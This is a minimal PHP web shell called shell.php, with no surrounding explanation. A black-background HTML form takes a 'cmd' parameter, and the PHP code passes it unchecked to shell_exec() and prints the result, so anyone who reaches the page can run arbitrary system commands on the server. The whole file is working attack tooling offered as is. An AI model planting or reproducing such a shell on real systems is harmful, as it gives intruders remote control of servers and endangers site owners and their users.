<html>
<head></head>
<title></title>
<body style="background: black;color: wheat;">
    <form action=shell.php method="GET">
        <input type="text" name="cmd">
        <input type="submit">
    </form>
</body>
</html>

<?php
$cmd = $_GET['cmd'];
echo "Your Command : ".$cmd."<br>";
echo "========================Result========================</br>";
echo "<pre><xmp>".shell_exec($cmd)."</xmp></pre>";
?>
